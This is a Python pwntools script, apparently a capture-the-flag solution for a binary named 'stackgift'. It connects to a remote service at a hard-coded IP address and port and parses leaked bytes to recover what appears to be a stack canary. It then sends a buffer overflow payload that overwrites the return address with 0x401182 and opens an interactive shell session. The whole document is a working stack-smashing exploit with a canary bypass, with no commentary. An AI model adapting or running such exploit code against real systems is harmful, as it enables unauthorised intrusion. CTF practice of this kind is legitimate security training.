from pwn import *

r = remote('109.233.56.90',11607)
#r = process('./stackgift')
win = r.recvuntil('Now')

k = 0
temp = ''
li = list()
win = win[:-4]
for i in win:
    temp = temp + str(i) + ' '
    k = k+1
    print(hex(i),end=' ')
    if k == 8:
        print('\n')
        k = 0
        li.append(temp)
        temp = ''


print(li)
print('')
for i in range(0,len(li)):
    if((li[i][0]=='0')):
        print(li[i][-2:])
        if li[i][2] == '0':
            print('')
        else:
            print(li[i])
            kek = li[i]

print('kal')
print(kek)
lis = list()
kek = kek[:-1]
x = [int(i) for i in kek.split(' ')]
print(x)
kuk = b''
for i in x:
    kuk = kuk + p8(i)

print(kuk)
print(u64(kuk))
#kuk = p64(u64(kuk),endian='big')
print(kuk)
payload = b'A'*40+kuk+b'A'*8+p64(0x401182)
r.send(payload)
#for i in kek:
#    if i == '0' or i == ' ':
#        while i
r.recv()
r.interactive()
